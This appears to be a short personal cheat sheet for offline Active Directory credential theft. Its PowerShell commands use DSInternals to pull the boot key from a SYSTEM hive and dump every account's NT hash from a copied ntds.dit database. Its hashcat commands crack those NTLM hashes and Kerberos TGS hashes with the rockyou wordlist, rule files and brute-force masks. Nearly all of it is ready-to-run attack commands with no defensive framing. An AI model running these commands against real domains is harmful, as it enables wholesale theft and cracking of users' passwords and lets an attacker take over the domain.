#https://www.dsinternals.com/en/
#https://attack.stealthbits.com/ntds-dit-security-active-directory

```powershell
Compress-Archive -Path C:\Users\Public\Downloads\poon -DestinationPath C:\Users\Public\Downloads\poon.zip
```


#Install-Module DSInternals -Force

```powershell
Import-Module DSInternals
$Key = Get-BootKey -SystemHiveFilePath C:\Users\p4yl0ad\Desktop\AD\poon\registry\SYSTEM
 
Get-ADDBAccount -BootKey $Key -DatabasePath 'C:\Users\p4yl0ad\Desktop\AD\poon\Active Directory\ntds.dit' -All |
  Format-Custom -View HashcatNT | 
  Out-File C:\Users\p4yl0ad\Desktop\AD\poon\Hashdump.txt
 ```
hashcat -m 1000 -a 0 Hashdump.txt -o Cracked.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

hashcat -m 1000 -a 0 Hashdump.txt -o Cracked-otrta.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt -r /usr/share/hashcat/rules/otrta.rule

hashcat -m 1000 -a 3 --custom-charset1=?l?d?u --username -o cracked.txt .\Hashdump.txt ?1?1?1?1?1?1?1?1


**Ran out of options:**
```
hashcat -m 13100 -a 0 --outfile hashnamecracked.txt hash.txt /opt/SecLists/Passwords/*.txt --force -r
/usr/share/hashcat/rules/best64.rule
```
